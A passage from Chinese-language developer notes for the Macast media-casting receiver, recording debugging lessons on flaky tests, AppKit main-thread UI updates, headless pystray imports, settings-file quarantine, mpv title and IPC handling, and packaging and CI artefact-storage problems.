  这个变量被测试的写法悄悄固定住了。教训分两半：**桩要按协议写完整**（HTTP 就要有终止空行），
  以及**一条用例要在至少两种读法下成立**才算数。
- **并行跑的用例共享夹具路径，单跑绿、整组红**（同一轮，与上一条同一族但方向相反）。第一版每个中转
  用例都写死临时目录 `relay_test_<pid>` 和中转 id `test_id_1`，于是并行时它们互相覆盖同一个
  `test_id_1.mp4`：一条**因为读了别人的文件而通过**，另一条**在自己从没写过的文件上失败**，
  而读起来完全像产品的并发问题。修法两条：目录与 id 都带一个进程内自增序号，每条用例独占；
  以及**把失败当成信息**——单跑通过却整组失败，第一问永远是"夹具是不是共用的"。

- **rumps 0.4.0 自己一次都不做主线程派发**（`rumps/rumps.py` 里 `callAfter` 出现 **0 次**），
  所以 `rumps.notification`、`Menu.clear`、`insertItem_atIndex_`、`MenuItem.title=` 全部**在调用它的那个线程上
  直接操作 AppKit**。用户报的"菜单有时要点好几次，点一次就又消失了"就是这个：正在 tracking 的 NSMenu
  一旦在别的线程被改动，AppKit 立刻收起菜单，那一次点击作废。症状只在**用户正握着菜单的时候**别处发生了
  UI 写入时出现，所以它时好时坏。这条同时解释了 §4.2 里"协议开关不许整表重建"那条注释为什么必要。
  两处违规已修（套件 **Part 47** 钉住，24 条，两个变异体各自变红）：
  ① `App.notification` —— 它挂在 `cherrypy.engine.subscribe('app_notify', …)` 上，而全仓有
  **52 处 `publish('app_notify', …)`**（`macast/` 49 + `macast_renderer/mpv.py` 3），来自 CherryPy 工作线程、mpv 的 IPC 线程、镜像线程；这个数字**由 Part 47 用 AST 现场数出来，再反过来比对写它的两处散文**（本条与 Part 47 自己的头注释），抄错的数字当场变红 —— `grep` 数出来的是 47，因为它既看不见跨行写的调用、也数不清被注释掉的旧报告。现在 Darwin 分支
  走 `call_on_main_thread`（pystray 分支**故意不动**：§4.8 那条"通知失败不许吃掉 teardown"的契约是按
  它就地抛/就地截断写的）。
  ② `Macast.update_service_status` —— cherrypy 的 `start`/`stop` 钩子跑在 **SERVICE_THREAD**
  （`server.run_async` 就是在别的线程上 `engine.start()` 的），而它写 `toggle_menuitem.text`
  ＝`NSMenuItem setTitle_`，也就是**用户点服务开关的那一瞬间**从后台改菜单。
  **`gui.MenuItem` 的 `text/checked/enabled` setter 本身就是未经保护的 AppKit 写**（view 已经挂上时），
  新加写入点的人必须给出"我为什么在主线程上"的理由：Part 47 因此扫 `macast.py`（七处，逐条登记理由：
  菜单回调、构建期还没有 view、已经走队列的 `_refresh_ip_menu`/`update_service_status`）
  与 `macast/plugins/**`（只许 `build_menu*`/`on_*` 这两种名字）。
  两条顺带记下的机理：`performSelectorOnMainThread:waitUntilDone:NO` 只在**默认 run-loop mode** 派发，
  所以菜单开着时排队的改动会**等用户松手**才落地（这正是我们要的方向：它不再从光标底下抽走菜单）；
  而**循环还没起来时**排队的改动会在 `App.run()` 起来后立刻执行 —— 已用真机探针验过（`app.run()` 之前
  从 `SERVICE_THREAD` 排的notification 与 setTitle_ 都在 `MainThread` 落地，
  真 `NSUserNotificationCenter` 接受这一条延后调用），所以启动横幅不会被打桩测试"测出来的一条假绿"吞掉。
- **`import pystray` 在没有 X 显示的那台机器上会抛 `Xlib.error.DisplayNameError`，不是 `ImportError`**。
  `pystray` 的包 `__init__` 会挑一个后端，而 `pystray/_xorg.py` 在**模块作用域**就调
  `Xlib.display.Display()`。所以 `macast/gui.py` 顶部一旦 `import pystray`，
  **整个 `import macast.macast` 就被毒掉** —— 而 `macast.macast.cli()` 从来不建托盘，
  它只跑 `Service(...)`。后果是 README_ZH 写明的 Linux 入口 `macast-cli`
  在一台无头服务器上**根本起不来**（`ModuleNotFoundError` 都不会有，报的是 Xlib 那一句），
  而本机是 macOS 走 rumps、验证套件又从不 import `gui.py` 的 pystray 分支，所以**没有红过**。
  现在 `gui.py` 只在真要建托盘时经 `_pystray()` 惰性导入。Part 50 三面守着：
  ① AST 扫 `macast/*.py` 与 `macast_renderer/*.py` 的模块作用域 import，出现
  `pystray`/`Xlib` 即红（并断言扫到的文件数 > 10，免得扫描本身空转）；
  ② 子进程真的**删掉 pystray**（meta_path 拦截器）、不设 `DISPLAY`、`sys.platform='linux'`，
  再 `import macast.macast` 并确认 `cli` 可调用 —— 外加变异体：把模块级 `import pystray`
  拼回去，这一条必须红（拦截器自己会报告"确实拦到了"，否则这条用例是假的）；
  ③ 用 `_pystray()` 的三处调用点必须先绑定 `pystray = _pystray()` 再用。
  **同一族陷阱也打在套件的桩上**：Part 5 那两处 `try: __import__("pystray") except ImportError`
  在无头 Linux 上接不住 `DisplayNameError`，于是 `macast_mod` 从未定义，
  于是文件后面（现 verify_cast_airplay.py:2166）那行模块级的
  `macast_mod.SETTING_DIR` 让**整个套件在打印任何结论之前死掉**。
  CI 正是这么跑的（没有 display），所以那两处已改成 `except Exception`。
  这里刻意**没有**给热插拔那约 200 行加"跳过"守卫：响的崩溃会诚实地挡住 CI，
  静默的跳过才是"不提问的检查等于通过的检查"。
- **`_wait_until(lambda: os.path.exists(那个文件))` 之后再去读内容，是读半份文件**。
  假二进制的 argv 用的是 `printf '%s\n' "$@"` —— **一个参数一行**，所以"文件存在"发生在
  第一行刚落盘时，而不是全部落盘时。macOS 上进程起得慢到恰好躲开，Linux runner 上
  Part 9 那条"配置文件就是二进制被指过去的那份"读回来的 argv **只有 `-v`** 并当场变红
  （`--ci` 正确地拒绝了它：这是 Part 34 之外的红）。判据改成**等那个事实**
  （`_wait_until(... and config9 in open(...).read())`），Part 9/14/26 三处同一形状一起改。
  **同一族的第二种形状是"等一个事件的副作用"**：Part 24 里"这一路不挂 HTTP 服务"那条
  断言读的是 `_sink`/`_server`/`playing_url()`，而 OFFER 按设计**早于**编码器与服务存在
  （低延迟通道被设备拒绝时不许先养一个 ffmpeg 再拆，见 §4.8），所以"设备看见 OFFER 了"
  并不蕴含"会话已经把 sink 交出去"—— 同一份代码在 Mac 上过、在慢一点的 runner 上红
  （`server=None sink=None url=''`）。判据同样是**等那个状态**（20 秒上限）而不是抓一瞬间。
  这条和 §4.2 末条、§4.13 的"假 ffmpeg 抄虚构格式"是同一族：**测试自己的实现也是实现**，
  只在非 macOS 机器上才现形的那一半，只有那个 Linux `verify` job 看得见（见 §6）。
  **第三种形状是"计数器在答复之后才加"**（2026-10-04，同一份 v0.19 代码本机 2226/2232 全绿、
  Linux 容器 `--ci` 红一条）：`screen_mirror._StreamHandler.end_headers()` 是
  `summary = super().end_headers()` **先把 header 块刷出去**、然后才 `session.exchanges += 1`，
  所以客户端读回 404/403 的那一刻服务端线程可能还没走到那一行。Part 56/B 那条
  「这个会话在 HTTP 上不供字节流 —— 播放器拿到的是一句诚实的 404」把 `exchanges == 1`
  和状态码写在同一个断言里，Linux 上读回的就是 `404 exchanges=0`（产品行为是对的，
  **红的是观察时机**）。四处同一个形状（Part 42 的 `>=1`、`>=2`、`== 2 + limit + 2` 与
  Part 56/B 的 `>=1`）都改成先 `_wait_until(lambda: 计数器到期望值)` 再断言。
  留在这里的理由和 Part 9/24 那两条一样：**凡是"某件事发生过"的判据坐在别人的账本上，
  就要等那个账本，不要抓客户端返回的那一瞬间**。
- **读不懂的设置文件必须整份搬开，不许静默用默认值覆盖它**（2026-10-05，v0.22.0；**这一格是我自己造成的**：
  在 .68 上用 PowerShell 5.1 的 `Set-Content -Encoding UTF8` 写他的 `macast_setting.json`，那个 cmdlet
  不管你怎么标都**在前面加一颗 BOM**，`json.load` 当场抛 ⇒ 旧 `Setting.load()` 只 `logger.error` 一句、
  把内存留成空 dict ⇒ **下一次 `save()` 用 11 个默认值覆盖了他的 36 个键**（含 `Api_Token`，
  于是所有已配好的快捷指令同时失效）。三层收口，缺一层就还会发生：
  ① 读用 `encoding="utf-8-sig"`（那颗 BOM 从此不构成故障，写侧本来就是 `json.dump` 默认
  `ensure_ascii=True` 的纯 ASCII，不需要动）；
  ② **解析失败不再"从默认值开始然后照写"** —— `quarantine_unreadable_settings(reason)` 先把原文件
  `os.rename` 到 `macast_setting.json.corrupt-<时间戳>`（**move 不是 copy**：写的路径必须是空的，
  否则下一次保存仍然覆盖他的字节），再返回默认值，拒绝的那一行 ERROR **同时**点名副本位置和
  「可以把自己的配置从那里搬回来」；
  ③ **同秒的多次拒绝必须加后缀**（`-1` / `-2`），因为副本**按秒**命名而一次启动可以拒三次
  （三个不同的坏文件），第一份还没落地第二次就会把别人的坏文件**盖掉** —— 这一格由 Part 61 用
  冻结的 `utils.time` 逼出来（三次同名戳 ⇒ 必须三个不同文件）。
  两个方向的边界都写在代码里：顶层不是对象（`json.load` 成功不等于合同成立，`[...]` 一样要搬开）、
  `rename` 本身失败时**不再声称搬开了**，改成说「在修好它之前不要保存设置」并点名路径、文件原地不动、
  助手返回 `None`。同一个文件还有**第二个读者**（`scripts/selfcheck.py` 读设置那段），
  它也必须 `utf-8-sig`，否则两份读者对"这台机器有没有配置"给出相反答案 —— Part 61 拿 AST 把两处
  的 open 模式绑在一起（读侧必须含 `("r", "utf-8-sig")`，写侧恰好一个 open 且带显式 encoding）。
  **打桩纪律（这一轮新学的一条，写在这里因为踩过）**：桩要打**模块自己的全局名字**
  （`utils.time`、`utils.os` 赋一个代理类），绝不改共享的 `time` / `os` 模块属性 ——
  后者会波及同进程里套件的其它代码，我第一版就把它变成了"测试自己的错"而不是产品行为。
  回归用例 **Part 61（18 条）**，七个变异体见 §2 末条。
- **写文件的代码要自己把目录建出来**（2026-09-25：§4.2 上一条预告的那个 job，第一次真跑就抓住一条**产品 bug**）。
  `Service._ensure_self_signed_cert()` 让 openssl 往 `SETTING_DIR/macast.key` 写，而那个目录在此之前
  **只有 `Setting.save()` 会建**。一台干净机器上（GitHub runner、刚装 Macast 的用户）它不存在 ⇒
  openssl 非零退出 ⇒ 生成器回 `(None, None)` ⇒ `ChromecastProtocol._ensure_cert()` 交出一个不存在的路径
  ⇒ `ssl.load_cert_chain` 抛 `FileNotFoundError`，**Cast 的 TLS 接收端在真 8009 上根本没有起来**。
  而日志里唯一那行说的是 `-addext unsupported` —— 那是旧代码对**任何**非零退出的猜测，
  它把真实原因（目录不存在）盖掉了，症状（"Chromecast 搜得到投不上"）会长得像一个协议 bug。
  三层收口：① 生成前 `os.makedirs(SETTING_DIR, exist_ok=True)`，建不出来就指名那个目录并拒绝；
  ② 新增 `_openssl_error(exc)`，把 **openssl 自己打印的 stderr 第一行**带进重试 warning 与最终 error
  （`subprocess.run(check=True)` 抛出的异常 `str()` 只有命令行和退出码，等于没说）；
  ③ 套件的 Part 3 现在把 `utils.SETTING_DIR` / `cast.SETTING_DIR` / `server.SETTING_DIR` 一起改指临时目录 ——
  因为在那之前，那段真 socket 端到端**一直在往用户真实的配置目录写 `macast.key` / `macast_cast.crt`**，
  正是 §10 第一条明令禁止的事（而它全绿了这么久）。
  **两个变异体各自变红，红法不同且都对**：删掉 `makedirs` ⇒ 8 条红（3 条新用例 + 5 条 cast e2e/mDNS，
  也就是"整段 Cast 接收端死了"这件事本身）；只把两条日志消息改回旧写法 ⇒ 恰好 2 条红。
  顺带记一条**测试自己的谎**：失败路径那两条消息的用例，第一版把生成器指向了**上一轮已经写好证书**的目录，
  于是它走"文件已存在"的早退分支、返回旧路径、一条日志都不发 —— 用例对着"什么都没有发生"点了两个绿勾。
  现在用一个仍然为空的第二目录，并要求这次调用**真的**返回 `(None, None)` 才算数。
- **刚写进目录的那个 `.py`，导入系统可以根本看不见它**（2026-10-03 抓自 v0.18.0 的 CI —— 本机与手边的 Linux 容器**全绿**）。
  `MacastPluginManager.install_file()` 的形状是「复制文件 → `refresh()` → 导入 `renderer.<名字>`」，而 CPython 的
  `FileFinder` **只在目录的 `st_mtime` 变化时**才重新 `listdir`（`importlib._bootstrap_external` 里那句
  `if mtime != self._path_mtime: self._fill_cache()`）。时间戳粒度粗于"复制 → 导入"这中间几微秒的机器（GitHub runner 就是），
  于是刚落地的那个**完全正常的插件被判成"加载不了"**；真实原因被 `load_from_file` 的 `except Exception` 吞进日志
  （`No module named 'renderer.incoming'`），用户和 CI 读到的都是 `ValueError: 插件无法加载或不适配当前系统`。
  修法一行：复制之后 `importlib.invalidate_caches()` —— 那本来就是文档给"往 sys.path 的目录里加了文件"的那句 API，
  三条安装路径（`install_file` / `install_url` / 设置页 `plugin-file` 上传）全都汇在这一处，所以一处就够。
  **回归用例在 Part 11，形状是"把判定权从机器手里拿回来"**：套件把 `_path_stat` 读到的目录 mtime 钉进一个一天宽的桶，
  先要求**裸 `importlib.import_module` 真的看不见**新文件（这条不红就说明仿真没咬住、后面那条是假的），
  再要求 `install_file()` 仍然装得上。变异体（删掉那一行）在 Linux 容器里**恰好红 1 条**，且红的那条详情印的就是
  CI 当初那句 `ValueError: 插件无法加载或不适配当前系统`，`--ci` 当场拒绝。
- **同一趟抓到的第二条"只在非 macOS 机器上红"**：Part 59 那条「空结果要说清是哪一种空」把
  「这台机器装没装 yt-dlp」当成了被测事实 —— runner 上没装 ⇒ 第一问拿回的是**第二句**答案，断言就红了。
  判据还是那句「两种 runner 上说同一句话」：`find_command` 也必须打上桩，让它答"装了"，
  而不是指望跑套件的那台机器碰巧有什么（与 §4.8 的 Part 52 把 `sys.platform` 钉成 darwin 是同一条规矩）。
- **夹具脚本里的字符串拼接，那对括号是承重的**（2026-10-02）：Part 55 那几段假 ffmpeg 由
  `(r"""…""" + _avf_body55 + r"""…""").replace("@RECEIPT@", _rec)` 拼出来，**括号不能省** ——
  省掉之后 `.replace` 只绑到**最后一段**上，于是第一段写出的 argv 行落进一个**字面叫 `@RECEIPT@`
  的文件**（就在 CWD 里），而 `GOT12`/`AUD1920` 去了真 receipt。为读一份永远不可能含那行的 receipt
  花掉**四趟全套件**；断言详情印的是 `[]`，读起来恰好像一次计时竞态，而它不是。
  这是"假 ffmpeg 抄虚构格式"（§4.2 上面那条）与自己人打自己人的同一族：**测试自己的代码也是实现**，
  拼错的方式在真机器上照样是"静默地什么都没测"。
- **回落路径会在 spawn 后一两毫秒里拆掉那个 ffmpeg，比 POSIX shell 跑到第一行 `printf` 还快**
  （2026-10-02 实测：48 个 shell 各拿到 0–5 毫秒的先手，**没有一个**写下自己那一行）：Part 55 的 G 段
  （OS 在 start 时拒绝 SCK 流、avfoundation 接管）**允许 SCK 那次尝试自己的 argv 行缺席** ——
  它的拒绝记在 `feeder.start()` 里面，而重试路径转身就把那个进程拆了。证明"SCK 先走过"的
  不是那行 receipt，是那条 `ScreenCaptureKit gave no frame (...)` warning（它只可能在一次成功的
  `Popen` 之后发出）加上 `_calls55['n'] == 1`；receipt 在 avfoundation 那一段仍被完全信任
  （同步探测 + 长寿 start），以及"绝不许出现的东西"（管道 token）也靠它。
  **偶尔真跑进来的那半行**必须仍然排在 avfoundation 探测之前，否则它描述的次序就不是这个故事的次序。
- **改播放器的地址，就必须改播放器的名字**（2026-10-05，用户报「标题不对哦~」；症状是投完 bilibili
  网页地址之后，本机 mpv 的窗口写着 `media - mpv`）。**这一格不是样式问题，是一条会复发的接缝**：
  mpv 的默认 `--title` 模板是 `${?media-title:${media-title}}${!media-title:No file} - mpv`（mpv v0.41.0
  实测逐字），而 `media-title` 的取法是「`force-media-title` 非空就用它，否则用文件的 `title` 标签，
  否则用 `filename`」—— 而 **`filename` 对 URL 只报最后一段路径**。我们的中转地址是
  `/relay/<随机 id>/media`，末段恰好是 `media`，于是窗口那个词就是它。**没有任何一处"写错了"：
  是「换地址的那条路没人负责换名字」**。所以判据收在这句话上，落在 `macast/protocol.py`：
  ① **`force-media-title` 是我们的接缝**（`MPVRenderer.set_media_title()` 同时写 `title` 与
  `force-media-title`），**`--title` 永远是用户的选项，我们一个字都不写**；
  ② **只有一个主人**：`reload()` 里那次 `loadfile` 之后要把名字重新交回 `set_media_title(self.title)`，
  否则"重载就把标题冲掉"会长得像"mpv 又读回了文件名"；
  ③ **每一条会换播放器地址的路都要命名** —— 这次数出来 12 个站点（7 个直接命名 + 3 个包装 +
  1 个别名 + 1 个重投），`cast_uri` / `_post_cast_uri`（带 `cast-title`）/ `_playlist_step`（连播步进，
  以前只换地址不说话）/ AirPlay 的 PLAY 分支 / Cast 的 LOAD（读发送端自己的
  `media.metadata.title`，走 `protocol_cast.sender_media_title()`）/ 历史重投（带存下来的那个标题）
  全在同一张表里。**G 段是一条全仓审计**（用 AST 数站点，不是按记忆点名），所以"以后又加了一条换地址的路
  忘了命名"这件事会被机器抓住，而不是等到用户再报一次。
  **四条只有真机才教得了的 mpv 读取事实**（都是我这轮的仪器先错后对的）：
  空闲播放器上 `media-title` / `filename` / `duration` / `time-pos` 回的是
  `{"error": "property unavailable", "data": null}`，而 `force-media-title` 回 `''` 且
  `error: "success"` —— 所以**一次批量读取要按 `request_id` 是否凑齐来终止**，按"每条都 `error=='success'`"
  筛就永远凑不齐，套接字直接超时（§5 那条「`{"error":"success"}` 是成功」在批量读取下还不够用）；
  「在播的是哪一路流」要问 **`path`**（完整的交接地址），`filename` 注定是 `media`；
  **「在播」判据是等 `time-pos` 真的变成一个数**，不是抓一瞬间的 `duration` —— 转封装那条路的文件
  还在长的时候根本没有可信长度（§4.14），实测 `duration=None` 而 `time-pos` 从 0.96 走到 4.0，
  这一格第一版把产品判成了坏；
  窗口那个字串的**最后一格证据要留着当症状的见证**（`filename='media'` 打在仪器输出里而不是当成失败），
  否则下一次"修好了"的判据会悄悄变成"我不再问那个属性"。
  回归用例 **Part 62（50 条）**：A 命名接缝 / B·C 命令行 / D reload / E 播放列表步进 /
  **E2 `cast_uri` 的行为** / F AirPlay PLAY / **F2 发送端 LOAD 命名** / G 全仓审计。
  **两个覆盖率空洞是这一轮学到的形状，比数字更该留下**：六个定点变异体里
  **第三支第一次 0 红**（把 `sender_media_title()` 换成 `media_resolve.title_for_uri(url)`）——
  用例问的是"这条路上有没有说话"，**没问"说的是谁的名字"**，所以一个会说话的**错名字**照样全绿；
  补法是 F2（13 条）：真的发一次 LOAD 消息，要求播放器收到的那个字串**就是发送端卡片给的那一个**，
  并且第一次因为错误的原因通过的那条要一起换掉。**第四支第一次只红在 G 段的计数器上（1 条）**——
  也就是删掉 `cast_uri` 的命名行之后，**行为断言一条都没响**，是全仓审计那个**计数**在替它们干活；
  补法是 E2（9 条）：把 `cast_uri` 真的打一遍（`MockRenderer` 因此需要 `set_media_title`，
  少这个方法当时是 `AttributeError` 而不是红），要求命名那一行真的跑过、且跑的是**传进来的那个**标题。
  补完之后六支各自红 **4 / 2 / 5 / 9 / 4 / 5** 条，每个跑完整套件、还原后 md5 逐字节一致。
  真实网络那一半在 §4.14 末（同一趟把整条产品路径打到本机 mpv，17 问 0 红）。
- **「这条媒体是直播吗」必须一路走到播放器命令行，而且中间没有人有权猜**（2026-10-06；
  §4.1 末两行是它的两个源头读数，这里是那段路）。它和上一条命名接缝是**同一条形状的两种**：
  换地址的那条路要换名字，换地址的那条路也要换"这一路要不要提前缓冲"。**三个坑各自独立**：
  ① **交接顺序**：`PlaybackGuard.set_media_url()` 里 `_note_media_live()` 必须排在
  `PlaybackGuard.owner = self._protocol` **之后**、`self._protocol.set_media_url(...)` **之前** ——
  早了问不到新主人（owner 还是上一个插件），晚了播放器已经拿到地址、这一路的答案过期。
  ② **这个接缝故意不叫 `set_media_live`**（`macast/renderer.py` 的 `note_media_live`）：
  `Renderer.methods()` 按 `set_media_` 前缀枚举，而 `MacastPluginManager` 会把它枚举到的**每一个名字**
  订阅到 CherryPy 总线上 —— 写成那个名字等于往总线上新挂一条谁都没发的消息，
  并且让所有内置插件以为自己该实现它。所以 **L 段是 AST 审计而不是文本 grep**（grep 会撞上
  解释这句话的那段 docstring）。③ **谁在换地址谁就要清掉旧答案**：`release_playback()`（守卫交还所有权时）、
  `_playlist_step` 与 `cast_uri`（自己换地址）、`protocol_cast` 的 STOP 与会话拆除，全部写 `None`；
  漏一处就是"上一部片子的直播判决管到下一部"。判据坐在 `media_is_live()` 上，
  而**唯一有资格的子协议是真正把媒体交给播放器的那个**（DLNA 的 `release_playback` 清自己那份）。
  回归用例 **Part 64 的 E 段（31 条）**——它是这轮红得最多的一段：那支"删掉守卫里那次交接"的变异体
  红 **24** 条（13 条在 E、8 条连带 F、3 条连带 G），因为**这一格是全链最承重的一环**。
- **状态变了才广播**（2026-10-06）：`DLNAProtocol.set_state()` 以前无条件写队列 + 置 `_state_event`，
  于是播放中**每次 `update duration` 都发一遍 GENA**。在用户自己的日志里量到的是
  3 小时 **505 次时长上报，其中 464 次（92%）值没变** —— 九成的广播是对着同一个数喊话。
  判据先算（`changed = ... != value`），只有**变了且被观察**才入队；`KeyError` 照旧留给未知变量名
  （那是我们自己的表错了，不该静默）。顺带把 `macast_renderer/mpv.py` 的 `update duration` 从 INFO
  降到 **DEBUG**：它 5 秒一条，而它 92% 的时候在说"没变"。用例是 Part 64 的 J 段（13 条）。
- **SSDP 的定时重announce 要先问它还活着没**（2026-10-06）：`Service.notify()` 以前每约 31 秒
  无条件拆了重建 SSDP 监听器。用户那份 3 小时 07 分 / **8,921 行**的日志里，这占了
  **364 次 publish ⇒ 2,190 行 `Registering` + 2,184 行 `Un-registering` ≈ 整份日志的 49%**，
  而 `Sending byebye` 是 **0** 行。更说明问题的是那 90 秒按 USN 归属的对照探针：**349 次轮询 / 349 次答复，
  最大间隔 0.0 秒** —— 也就是说这一轮重启**什么都没买到**，只是把日志塞满。**但周期触发器不能整条删掉**：
  收包线程被异常干掉之后 `running` 仍是 `True`、UDP/1900 仍被占着（§4.2 那条"别把端口在听当证据"的
  同一族），页面读起来一切正常而再也无人应答。现在 `ssdp.is_healthy()` 是那一问
  （`running` 为假 ⇒ 答"健康"：一个**主动停掉**的服务器不是故障），不健康才重启并留一行 warning。
  用例是 Part 64 的 K 段（11 条）。
- **`loadfile` 的第五格是选项字典，不是第三条字符串**（2026-10-06，症状：`reload()` 之后 mpv
  回 `{"error": "invalid parameter"}`，播放器停在原地）。mpv IPC 的形状是
  `loadfile <url> <flags> <index> <options>` —— 位置参数只有四个，恢复播放位置要写进**第五格的字典**
  （`{'start': '00:00:12'}`），写成 `['loadfile', uri, 'replace', 'start=00:00:12']` 是无效参数。
  同一格还是**直播形状唯一的落点**：`LIVE_LOAD_OPTIONS`（10 项）只有从这里进得去，
  没有意见（`None`）时**什么都不交**（连 `"0"` 也不交，好让 3 元的裸形状继续是裸形状）。
  本机复测（`/tmp/recv-lag`，私有 mpv 实例 + `clip30.mp4` 当直播源）分两种可信度，**别把它们混着引**：
  ① **不设这些选项**时 `lag = 墙钟 − 播放位置` 在 43 秒里从 **1.64 涨到 2.87 秒**（中位 1.98，
  趋势 +1.23 秒）—— 也就是它会**持续累积延迟**，这一条有幸存的 `rows.shipped.json` 可重算；
  ② 设了选项**能省下多少**，本机**没有可信读数**：`rows.ll_opts.json` / `rows.ll_argv.json`
  那两趟的源是**已经写好的文件**而不是按墙钟限速的，播放器读到墙钟前面去（`lag` 一路到 −47 / −94 秒），
  那是仪器不给力不是产品好。（这一条原来写的是"3.50 秒 → 0.38 秒且不漂"，那对数来自一次
  **没有落盘**的限速跑，2026-10-06 按现存数据复算不出来 —— 数字已按能复算的那一半改写，
  判据不变：承诺的是"**不再累积**"这个方向，**不是"稳定停在 0.x 秒"**。）
  ③ 选项**确实进得去也确实会还原**（今天复跑 `probe3.py`）：`audio-buffer` 0.2→0.0、
  `cache-pause` True→False、`stream-buffer-size` 128k→4k，下一次裸 `loadfile` 后全部回到默认 ——
  所以逐文件选项不会污染下一部片子。同一趟还量到 `start` 的两种写法：第五格 `{'start': '12'}`
  读回 `time_pos=12.0`，写进第四格（那是播放列表下标）mpv 直接回 `invalid parameter`。
  还有一条判据容易写错：`start` **只在没被声明为直播时才生效** ——
  对一路没有可寻址前缀的直播流做 seek 就是让它去找一个不存在的偏移。用例 Part 64 的 I 段（28 条）。

### 4.3 打包（v0.7.11 的产物曾经**全部无法启动**）

**症状**：`.app` / Linux / Windows 产物双击或运行后立刻退出，日志里是
`ModuleNotFoundError: No module named 'zeroconf'`（或 `... 'zeroconf._services' is not
a package`）。**源码运行完全正常**，所以很容易漏掉。

**两个原因，都要记住：**

1. **依赖列表写了多份然后漂移。** `zeroconf`（mDNS 广播，`macast/discovery.py` 顶层
   import）被加进了代码和 `requirements/common.txt`，但 **没**加进
   `requirements/darwin.txt`、`scripts/build_macos_arm.sh` 的内联 pip 列表、
   CI 里 4 个 job 各自的内联 pip 列表、以及 `setup_py2app.py` 的 `includes`。
   于是构建环境里根本没有它，py2app 看不到这个 import，产物就缺。
   → 现在 **`requirements/darwin.txt` 是唯一来源**（本地构建脚本也改为 `-r` 它）。
   加新依赖时，请同时检查：`requirements/*.txt`、CI 各 job、`setup_py2app.py`、
   pyinstaller 的 `--collect-all/--hidden-import`。

2. **`zeroconf` 不能只写进 `includes`，必须写进 `packages`。** 它同时发布 Cython
   编译产物和 `.py` 源码，而 `zeroconf/_services/__init__` 正是编译版。modulegraph
   会把 `zeroconf._services` 当成**单个扩展模块**（叶子节点）而不再下钻，包内于是
   只有 `lib-dynload/zeroconf/_services.so`、没有 `_services/` 目录：
   `ModuleNotFoundError: No module named 'zeroconf._services.info'; 'zeroconf._services'
   is not a package`。`packages` 是整目录拷贝，才能带上子模块；顺带把
   `ifaddr`（zeroconf 的唯一运行时依赖）也放进 `packages`。

**排查手法**（比读 build 配置快）：

```shell
# 1. 直接跑包里的可执行文件，看真实报错（不要只看 CI 绿）
env -u PYTHONPATH /Applications/Macast.app/Contents/MacOS/Macast
# 2. 确认可疑包是否真在包里（py2app 会把纯 Python 部分塞进 lib-dynload 或 zip）
find /Applications/Macast.app -iname "*zeroconf*" | head
```

**教训：CI 全绿 ≠ 产物能用。** 发版后一定要把下载下来的产物**真正启动一次**并确认
它监听了 8009/58880、`/api?query=status` 能返回版本号（见 §8）。

**反面的一半也成立：CI 全红 ≠ 代码坏了。** 2026-09-21 发 v0.7.15 时四个平台 job 全红，
但**只红在 `Upload artefact` 这一步**（构建 / arm64+i18n 校验 / 签名 / 打包 zip 全绿），
报错 `Failed to CreateArtifact: Artifact storage quota has been hit` ——
四处 `retention-days: 14` × 每次约 170 MB × 免费方案 500 MB 上限，从 9 月 14/15 那两波密集构建起
就一直撞（193 份 / 8.2 GB），与本次改动无关。修法是先删旧 artefacts 再把留存改成 **2 天**（`7012268`），
然后 `gh run rerun --failed` 重跑同一个 run（保留 tag 上下文，不用重推 tag）。
**Releases 的产物不受影响**：那是另一个桶，删 Actions artefacts 不会动到已发布版本的下载链接。
所以看 CI 失败时**先定位到哪一步**再判断是谁的锅；这一步红的修法（清存储）和代码红的修法（改代码）
完全不同，撞错了方向会白改一遍代码。

**改 2 天留存只是把墙推远，没有拆掉它**（2026-09-25 又撞一次：84 份 / 3.5 GB）。
算术很直白：一次四平台构建约 170 MB，免费方案上限 500 MB，所以**留存窗口内只要跑过三次构建就必然撞**，
而密集开发期一天就能推三次。更具体的一笔账：改之前那四个 `Upload artefact` 步骤是**无条件**的，
所以**每一次普通 main push 也都往 Actions 存储里放四份产物** —— 最近 27 次构建里 **14 次是主分支构建**
（另外 13 次是 tag），而主分支构建的那 ~2.4 GB 没有任何读者。
**P9（2026-10-04）把这笔账重新算了一遍，方向是让每次 tag 构建更贵，不是更省**：四个平台各自多出一个
extras zip（本机实测那一个 `Macast-WebRTC-extras-macos-arm64-cp312-v0.20.0.zip` = **26,884,928 字节**），
它们**挤在同一扇门里**（每个 job 的 `Upload artefact` 的 `path` 是两行 glob，不是第五次上传 ——
见 `build.yml` 那一步的注释），所以一次四平台构建从约 170 MB 变成约 **270 MB**，
500 MB 的免费上限从「三次构建必撞」变成「**两次就撞**」。结论不是再降留存（2 天已经是兜底），
而是那件已经存在的**清扫 job 现在是承重的，不是礼貌性的**：`Free artefact storage` 在 Release 发布成功后
按 id 删掉本轮 artefacts，所以它一旦失败（或被哪天改掉 `needs`），下一轮 tag 构建就是配额事故现场，
而事故现场读起来像"代码坏了"。反过来，**普通 main push 依然一个字节都不存**：extras 的构建步骤是**无条件**的
（那是唯一在发版夜之前演练 `build_webrtc_extras.py` 的地方），只有上传带门。
现在的做法是两道一起上，都在 `build.yml` 里，并由套件 **Part 46** 钉住：

- **四个 `Upload artefact` 步骤带同一个门**：只有 tag push 与 `release=true` 的手工 dispatch 才上传。
  普通 main push 照样四平台全构建，只是**不往 Actions 存储里放东西**——它没有读者。
  要一次性主分支构建就 dispatch `release=true`（或推个 `v*.*` tag）。
- **`Free artefact storage` job 在 Release 发布成功后按 id 删掉本轮 artefacts**。
  它**故意不在 release 失败时跑**：那种情况要用 `gh run rerun --failed` 只重跑 release 那一个 job，
  而它会下载本轮的 artefacts；提前清扫就把"一步重试"变成"四平台重建"（§4.3 上面那条经验的反面）。
- 留存 2 天降级为**兜底**（清扫 job 自己失败时）。

**注意 Releases 与 Actions 是两个桶**（v0.7.15 → v0.8.10 十二个版本的四个产物都在 Releases 里活得好好的，
同时 Actions 是满的），所以这套清扫**不会**动到任何人的下载链接。
Part 46 的三条变异体已逐个验过：改开一个门 / 删 `actions: write` / 把清扫放宽成 `always()`，
各自都会当场变红。

**查产物里有没有某个模块，要用点号名，而且 Linux 产物故意不含 pystray**（2026-10-02 验 v0.9.0
时差点报出一个假缺陷，两条都记在这里）：

- **Linux / Windows 产物是 PyInstaller `--onefile`**，`tar tzf` / `zipfile.namelist()` 只会给你
  **3 个条目**（LICENSE、README、那一个可执行文件），列不出内容。可行的办法是把可执行文件
  `strings -a` 出来再 grep —— PyInstaller 的 TOC 里模块名是明文。**但名字是点号形式**：
  搜 `PIL/Image` 得 0，搜 `PIL.Image` 得 15（Linux 与 Windows 一样多）。
